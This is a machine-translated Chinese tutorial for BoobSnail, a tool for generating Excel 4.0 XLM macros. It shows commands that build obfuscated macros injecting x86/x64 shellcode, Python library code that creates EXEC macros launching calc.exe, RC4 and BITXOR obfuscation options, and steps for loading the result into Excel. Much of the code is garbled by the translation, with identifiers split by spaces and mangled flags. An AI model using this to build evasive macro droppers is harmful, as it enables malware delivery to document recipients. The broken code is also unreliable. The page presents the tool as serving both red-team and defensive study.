# 允许生成 Excel 4.0 XLM 宏

> 原文：<https://kalilinuxtutorials.com/boobsnail/>

[![](img/ca5d45694e05a4c33daafdf4c0f4a468.png)](https://1.bp.blogspot.com/-h292nklevH0/YULRmfmgEuI/AAAAAAAAK2o/3UOgYegHPu4l8zlJEcbZr4wnSpMdlnoBwCLcBGAsYHQ/s728/boobsnail%2B%25281%2529.png)

**BoobSnail** 允许生成 XLM (Excel 4.0)宏。其目的是支持 XLM 宏代中的 RedTeam 和 BlueTeam。特点:

*   各种感染技术；
*   各种混淆技术；
*   将公式翻译成英语以外的语言；
*   可以用作一个库——你可以很容易地编写自己的生成器。

**建造和运行**

测试于:Python 3.8.7rc1

**pip install-r requirements . txt
python boobsnail . py
。。*.._*
_ |*_ | _*/*/| | | | | \/_ | _*\/_ _ \ | |
| _ \(<_>|<_>)_ \ \/\ | \/*_ | | |*|
| _/_/_/_/| _/*/*(*)***

**发电机使用情况**

**python boobsnail.py -h**

要显示可用的生成器，请键入:

**python boobsnail.py**

**例题**

生成插入 x64 或 x86 外壳代码的混淆宏:

**python boob snail . py excel 4 ntdonutgenerator–input x86–input x64–out boob snail . CSV**

生成运行 calc.exe 的模糊宏:

**python boob snail . py excel 4 exec generator–cmd " powershell . exe-c calc . exe "-out boob snail . CSV**

**在 Excel 中保存输出**

*   将输出转储到 CSV 文件。
*   复制 CSV 文件的内容。
*   运行 Excel 并创建一个新工作表。
*   添加新的 Excel 4.0 宏(右键单击 Sheet1 ->插入-> MS Excel 4.0 宏)。
*   粘贴单元格 A1 或 R1C1 中的内容。
*   单击数据->文本到列。
*   单击下一步->将分号设置为分隔符，然后单击完成。

**库用法**

BoobSnail 共享 excel4lib 库，允许创建自己的 Excel4 宏生成器。excel4lib 包含一些在编写生成器时可以使用的类:

*   Excel4 lib . macro . excel 4 macro–允许定义 excel 4 公式、值变量。
*   excel 4 lib . macro . obfuscator . excel 4 obfuscator–允许对 Excel4Macro 中创建的指令进行模糊处理；
*   excel 4 lib . lang . excel 4 translator–允许将公式翻译成另一种语言。

这个库的主要思想是将 Excel4 公式、变量、公式参数和值表示为 python 对象。因此，您可以更改指令属性，如公式或变量名称、值、地址等。以一种简单的方式。例如，让我们创建一个运行 calc.exe 的简单宏

**从 excel4lib.macro 导入*
#创建宏对象
macro = excel 4 macro(" test . CSV ")
#将值为" calc.exe "的名为 cmd 的变量添加到工作表中
cmd = macro.variable("cmd "，" calc . exe ")
#添加带参数的 EXEC 公式 cmd
macro.formula("EXEC "，cmd)
#转储到 CSV
print(macro . to _ CSV())**

结果:

**cmd = " calc . exe "；
= EXEC(cmd)；**

现在让我们假设你想混淆你的宏。为此，您只需导入混淆器并将其传递给 Excel4Macro 对象:

**从 excel4lib.macro 导入*
从 excel4lib.macro.obfuscator 导入*
#创建宏对象
macro = Excel4Macro("test.csv "，obfuscator = excel 4 obfuscator())
#将名为 cmd 且值为" calc.exe "的变量添加到工作表中
cmd = macro.variable("cmd "，" calc . exe ")
#添加带参数的 EXEC 公式 cmd
macro.formula("EXEC "，cmd)
。**

目前，excel4lib 共享两个混淆类:

*   Excel 4 lib . macro . obfuscator . Excel 4 obfuscator 使用 BITXOR、SUM 等 Excel 4.0 函数对您的宏进行模糊处理；
*   excel 4 lib . macro . obfuscator . excel 4 RC obfuscator 使用 RC4 加密来隐藏公式。

如你所见，你可以编写自己的混淆器类，并在 Excel4Macro 中使用。

有时你需要把你的宏翻译成另一种语言，例如你的母语，在我的例子中是波兰语。使用 excel4lib 非常简单。只需要导入 Excel4Translator 类，调用 set_language 即可。

**from excel 4 lib . macro import *
from excel 4 lib . lang . excel 4 _ translator import *
# Change language
excel 4 translator . set _ language(" PL _ PL ")
# Create macro object
macro = excel 4 macro(" test . CSV "，obfuscator = excel 4 obfuscator())
#将名为 cmd 且值为" calc.exe "的变量添加到工作表中
cmd = macro.variable("cmd "，" calc.exe")** 

结果:

**cmd =‘calc . exe’：
=运行程序(cmd)；**

目前，只支持英语和波兰语。如果您想使用另一种语言，您需要在 excel4lib/lang/langs 目录中添加翻译。

当然，您将需要创建一个将另一个公式作为参数的公式。您可以通过使用 Excel4Macro.argument 函数来实现这一点。

**从 excel4lib.macro 导入*
macro = excel 4 macro(" test . CSV ")
#将名为 cmd 且值为" calc "的变量添加到工作表中
cmd_1 = macro.variable("cmd "，" calc ")
#添加单元格包含。exe 作为值
cmd_2 = macro.value("。exe ")
#创建连接 cmd_1 和 cmd _ 2
EXEC _ arg = macro . argument(" CONCATENATE "，cmd_1，cmd _ 2)
#将连接调用作为参数传递给 EXEC formula
macro . formula(" EXEC "，EXEC _ arg)
# Dump to CSV
print(macro . to _ CSV())**

结果:

**cmd = " calc "；
。exe
=EXEC(CONCATENATE(cmd，r2c 1))；**

如你所见”。exe "字符串作为 R2C1 传递给串联公式。R2C1 是的地址。exe”值(行号 2 和列号 1)。excel4lib 返回对公式的引用，值作为地址。对变量的引用以它们的名称返回。您可能已经注意到，Excel4Macro 类会按照对象创建的顺序自动将公式、变量、值添加到工作表中，并且起始地址是 R1C1。如果您想将公式放在另一列或另一行中，该怎么办？可以通过调用 Excel4Macro.set_cords 函数来实现。

**从 excel4lib.macro 导入***
**macro = excel 4 macro(" test . CSV ")
#第 1 列
#向工作表添加名为 cmd 且值为" calc "的变量
cmd_1 = macro.variable("cmd "，" calc ")
#添加单元格包含。exe 作为 value
cmd_2 = macro.value("。exe ")
#第 2 列
#更改第 2 列
macro.set_cords(2，1)
EXEC _ arg = macro . argument(" CONCATENATE "，cmd_1，cmd _ 2)
#将 CONCATENATE 调用作为参数传递给 EXEC formula
EXEC _ call = macro . formula(" EXEC "，EXEC _ arg)
#第 1 列
#返回第 1 列。将跳线更改为第 1 列和第 3 行
macro.set_cords(1，3)
# GOTO EXEC call
macro . GOTO(EXEC _ call)
# Dump to CSV
print(macro . to _ CSV())**

结果:

**cmd = " calc "；=EXEC(CONCATENATE(cmd，r2c 1))；
。exe；
= GOTO(R1 C2)；；**

[**Download**](https://github.com/STMCyber/boobsnail)